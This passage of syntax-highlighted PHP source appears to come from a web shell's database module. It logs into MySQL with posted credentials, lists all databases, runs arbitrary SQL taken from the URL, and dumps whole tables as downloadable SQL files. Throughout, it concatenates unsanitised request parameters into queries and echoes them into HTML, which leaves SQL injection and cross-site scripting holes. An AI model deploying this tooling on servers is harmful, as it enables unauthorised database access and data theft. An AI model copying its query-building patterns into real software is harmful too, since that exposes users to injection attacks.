<span class="lineno">461</span>   <span class="k">else</span><span class="p">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;}</span>
<span class="lineno">462</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">]){</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];}</span>
<span class="lineno">463</span>   <span class="k">else</span><span class="p">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;3306&#39;</span><span class="p">;}</span>
<span class="lineno">464</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">]){</span>
<span class="lineno">465</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$sqlcon</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">]))){</span>
<span class="lineno">466</span>       <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">]);</span>
<span class="lineno">467</span>       <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Invalid credentials&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">468</span>       <span class="k">die</span><span class="p">(</span><span class="nx">sqllogin</span><span class="p">());</span>
<span class="lineno">469</span>     <span class="p">}</span>
<span class="lineno">470</span>     <span class="k">else</span><span class="p">{</span>
<span class="lineno">471</span>       <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;isloggedin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;true&quot;</span><span class="p">;</span>
<span class="lineno">472</span>     <span class="p">}</span>
<span class="lineno">473</span>   <span class="p">}</span>
<span class="lineno">474</span>   <span class="k">else</span><span class="p">{</span>
<span class="lineno">475</span>     <span class="k">die</span><span class="p">(</span><span class="nx">sqllogin</span><span class="p">());</span>
<span class="lineno">476</span>   <span class="p">}</span>
<span class="lineno">477</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]){</span>
<span class="lineno">478</span>     <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">);</span>
<span class="lineno">479</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlquery&#39;</span><span class="p">]){</span>
<span class="lineno">480</span>       <span class="nv">$dat</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlquery&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">481</span>       <span class="nv">$num</span> <span class="o">=</span> <span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$dat</span><span class="p">);</span>
<span class="lineno">482</span>       <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$num</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno">483</span>         <span class="k">echo</span><span class="p">(</span><span class="nb">mysql_result</span><span class="p">(</span><span class="nv">$dat</span><span class="p">,</span> <span class="nv">$i</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">484</span>       <span class="p">}</span>
<span class="lineno">485</span>     <span class="p">}</span>
<span class="lineno">486</span>     <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlf&#39;</span><span class="p">]){</span>
<span class="lineno">487</span>       <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;table=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;sqlf=ins&#39;&gt;Insert Row&lt;/a&gt;&lt;br&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">488</span>       <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;table border=&#39;1&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">489</span>       <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SHOW COLUMNS FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">];</span>
<span class="lineno">490</span>       <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">491</span>       <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">492</span>       <span class="nv">$fields</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">493</span>       <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
<span class="lineno">494</span>         <span class="nb">array_push</span><span class="p">(</span><span class="nv">$fields</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]);</span>
<span class="lineno">495</span>         <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;th&gt;&quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="lineno">496</span>         <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">497</span>       <span class="p">}</span>
<span class="lineno">498</span>       <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">499</span>       <span class="nv">$num_rows</span> <span class="o">=</span> <span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">500</span>       <span class="nv">$y</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="lineno">501</span>       <span class="k">for</span><span class="p">(</span><span class="nv">$x</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$x</span><span class="o">&lt;=</span><span class="nv">$num_rows</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span><span class="nv">$x</span><span class="o">++</span><span class="p">){</span>
<span class="lineno">502</span>         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]){</span>
<span class="lineno">503</span>           <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="lineno">504</span>         <span class="p">}</span>
<span class="lineno">505</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]){</span>
<span class="lineno">506</span>           <span class="k">if</span><span class="p">(</span><span class="nv">$y</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">30</span><span class="o">*</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nv">$y</span> <span class="o">&lt;=</span> <span class="mi">30</span><span class="o">*</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">])){</span>
<span class="lineno">507</span>             <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">);</span>
<span class="lineno">508</span>             <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$fields</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno">509</span>               <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT &quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; WHERE &quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; = &#39;&quot;</span> <span class="o">.</span> <span class="nv">$x</span> <span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
<span class="lineno">510</span>               <span class="nv">$dat</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">511</span>               <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$dat</span><span class="p">)){</span>
<span class="lineno">512</span>                 <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;td&gt;&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">);</span>
<span class="lineno">513</span>               <span class="p">}</span>
<span class="lineno">514</span>             <span class="p">}</span>
<span class="lineno">515</span>             <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">516</span>           <span class="p">}</span>
<span class="lineno">517</span>         <span class="p">}</span>
<span class="lineno">518</span>         <span class="nv">$y</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">519</span>       <span class="p">}</span>
<span class="lineno">520</span>       <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/table&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">521</span>       <span class="k">for</span><span class="p">(</span><span class="nv">$z</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$z</span><span class="o">&lt;=</span><span class="nb">ceil</span><span class="p">(</span><span class="nv">$num_rows</span> <span class="o">/</span> <span class="mi">30</span><span class="p">);</span><span class="nv">$z</span><span class="o">++</span><span class="p">){</span>
<span class="lineno">522</span>         <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;table=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;p=&quot;</span> <span class="o">.</span> <span class="nv">$z</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$z</span> <span class="o">.</span> <span class="s2">&quot;&lt;/a&gt; | &quot;</span><span class="p">);</span>
<span class="lineno">523</span>       <span class="p">}</span>
<span class="lineno">524</span>     <span class="p">}</span>
<span class="lineno">525</span>     <span class="k">elseif</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlf&#39;</span><span class="p">]){</span>
<span class="lineno">526</span>       <span class="k">switch</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlf&#39;</span><span class="p">]){</span>
<span class="lineno">527</span>         <span class="k">case</span> <span class="s2">&quot;dl&quot;</span><span class="o">:</span> <span class="nx">sqldownload</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">528</span>         <span class="k">case</span> <span class="s2">&quot;ins&quot;</span><span class="o">:</span> <span class="nx">sqlinsert</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">529</span>         <span class="k">default</span><span class="o">:</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlf&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">530</span>       <span class="p">}</span>
<span class="lineno">531</span>     <span class="p">}</span>
<span class="lineno">532</span>     <span class="k">else</span><span class="p">{</span>
<span class="lineno">533</span>       <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;table&gt;&quot;</span><span class="p">);</span>
<span class="lineno">534</span>       <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SHOW TABLES FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">];</span>
<span class="lineno">535</span>       <span class="nv">$dat</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">536</span>       <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$dat</span><span class="p">)){</span>
<span class="lineno">537</span>         <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;table=&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/a&gt;&lt;/td&gt;&lt;td&gt;[&lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;table=&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&amp;sqlf=dl&#39;&gt;Download&lt;/a&gt;]&lt;/td&gt;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">538</span>       <span class="p">}</span>
<span class="lineno">539</span>       <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">);</span>
<span class="lineno">540</span>     <span class="p">}</span>
<span class="lineno">541</span>   <span class="p">}</span>
<span class="lineno">542</span>   <span class="k">else</span><span class="p">{</span>
<span class="lineno">543</span>     <span class="nv">$dbs</span><span class="o">=</span><span class="nb">mysql_list_dbs</span><span class="p">(</span><span class="nv">$sqlcon</span><span class="p">);</span>
<span class="lineno">544</span>     <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_object</span><span class="p">(</span><span class="nv">$dbs</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">545</span>       <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="o">-&gt;</span><span class="na">Database</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="o">-&gt;</span><span class="na">Database</span> <span class="o">.</span> <span class="s2">&quot;&lt;/a&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">546</span>     <span class="p">}</span>
<span class="lineno">547</span>   <span class="p">}</span>
<span class="lineno">548</span>   <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$sqlcon</span><span class="p">);</span>
<span class="lineno">549</span> <span class="p">}</span>
<span class="lineno">550</span> <span class="k">function</span> <span class="nf">sqldownload</span><span class="p">(){</span> <span class="c1">// Download sql file function</span>
<span class="lineno">551</span>   <span class="o">@</span><span class="nb">ob_flush</span><span class="p">;</span>
<span class="lineno">552</span>   <span class="nv">$sqlcon</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">]);</span>
<span class="lineno">553</span>   <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">);</span>
<span class="lineno">554</span>   <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SHOW COLUMNS FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">];</span>
<span class="lineno">555</span>   <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">556</span>   <span class="nv">$fields</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">557</span>   <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
<span class="lineno">558</span>     <span class="nb">array_push</span><span class="p">(</span><span class="nv">$fields</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]);</span>
<span class="lineno">559</span>     <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">560</span>   <span class="p">}</span>
<span class="lineno">561</span>   <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">562</span>   <span class="nv">$num_rows</span> <span class="o">=</span> <span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">563</span>   <span class="k">for</span><span class="p">(</span><span class="nv">$x</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$x</span><span class="o">&lt;</span><span class="nv">$num_rows</span><span class="p">;</span><span class="nv">$x</span><span class="o">++</span><span class="p">){</span>
<span class="lineno">564</span>     <span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;(&quot;</span><span class="p">;</span>
<span class="lineno">565</span>     <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$fields</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno">566</span>       <span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
<span class="lineno">567</span>       <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT &quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; WHERE &quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; = &#39;&quot;</span> <span class="o">.</span> <span class="nv">$x</span> <span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
<span class="lineno">568</span>       <span class="nv">$dat</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">569</span>       <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$dat</span><span class="p">)){</span>
<span class="lineno">570</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">){</span>
<span class="lineno">571</span>           <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;NULL&quot;</span><span class="p">;</span>
<span class="lineno">572</span>         <span class="p">}</span>
<span class="lineno">573</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$fields</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">){</span>
<span class="lineno">574</span>           <span class="nv">$out</span> <span class="o">.=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n&quot;</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;, &quot;</span><span class="p">;</span>
<span class="lineno">575</span>         <span class="p">}</span>
<span class="lineno">576</span>         <span class="k">else</span><span class="p">{</span>
<span class="lineno">577</span>           <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
<span class="lineno">578</span>         <span class="p">}</span>
<span class="lineno">579</span>       <span class="p">}</span>
<span class="lineno">580</span>     <span class="p">}</span>
<span class="lineno">581</span>     <span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;);</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">582</span>   <span class="p">}</span>
<span class="lineno">583</span>   <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;-&quot;</span> <span class="o">.</span> <span class="nb">time</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;.sql&#39;</span><span class="p">;</span>
<span class="lineno">584</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
<span class="lineno">585</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span> <span class="o">.</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$out</span><span class="p">));</span>
<span class="lineno">586</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=&quot;</span> <span class="o">.</span> <span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&quot;;&quot;</span><span class="p">);</span>
<span class="lineno">587</span>   <span class="k">echo</span><span class="p">(</span><span class="nv">$out</span><span class="p">);</span>
<span class="lineno">588</span>   <span class="k">die</span><span class="p">();</span>
<span class="lineno">589</span> <span class="p">}</span>
<span class="lineno">590</span> <span class="k">function</span> <span class="nf">sqlinsert</span><span class="p">(){</span>
<span class="lineno">591</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">592</span>   <span class="nv">$sqlcon</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">]);</span>
<span class="lineno">593</span>   <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">);</span>
<span class="lineno">594</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ins&#39;</span><span class="p">]){</span>
<span class="lineno">595</span>     <span class="nb">unset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ins&#39;</span><span class="p">]);</span>
<span class="lineno">596</span>     <span class="nv">$fields</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
<span class="lineno">597</span>     <span class="nv">$f</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span> <span class="nv">$fields</span><span class="p">);</span>
<span class="lineno">598</span>     <span class="nv">$v</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">);</span>
